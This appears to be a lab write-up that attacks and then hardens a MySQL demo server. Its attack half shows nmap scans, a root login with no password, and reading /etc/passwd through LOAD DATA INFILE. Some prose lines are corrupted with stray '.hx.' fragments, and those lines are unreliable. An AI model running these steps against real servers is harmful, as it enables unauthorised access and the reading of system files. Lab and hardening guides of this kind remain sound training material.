# Attack

## Ping.hx.Server

```bash
ping -c4 demo.hx.local
```

## Port Scans

```bash
nmap -sV -Pn demo.hx.local
```

## Port Scans

```bash
nmap -sV -Pn demo.hx.local

// output

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
3306/tcp open  mysql         MySQL 8.0.31-0ubuntu0.20.04.1
3389/tcp open  ms-wbt-server xrdp
5910/tcp open  vnc           VNC (protocol 3.8)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## NMap MySQL Enum

```bash
nmap -p3306 --script mysql-enum demo.hx.local

// output

PORT     STATE SERVICE
3306/tcp open  mysql
| mysql-enum: 
|   Valid usernames: 
|     root:<empty> - Valid credentials
|     test:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
```

## Check Issues As Attacker

### Access MySQL

```bash
mysql -h demo.hx.local -u root --skip-password
```

### Verify for password policy

We verify that there is string password policy by creating a new user with weak password:

```sql
show databases;
select user, host from mysql.user;
create user 'sammy@localhost' identified by 'pass';
```

### Check Arbitrary File Read

We see that MySQL server has arbitrary file read vulnerability:

```sql
LOAD DATA INFILE "/etc/passwd" INTO TABLE test.tab;
select * from test.tab;
```

# Defend

## Patch Arbitrary File Read Vuln.

```bash
nano /etc/mysql/my.cnf
```

Comment out: 

```
#secure-file-priv = ""
```

## Change Default MySQL Service Port

```bash
sed -i 's/3306/22360/g' /etc/mysql/mysql.conf.d/mysqld.cnf
```

## Enable Password Complexity Policy

Open:

```bash
nano /etc/mysql/my.cnf
```

Add the .hx.or uncomment existing .hx.

```
plugin-load-add=validate_password.so
```

## Drop 'test' DB

```sql
drop database test;
```

## Obfuscate root Account

```sql
drop user 'root'@'%';
```
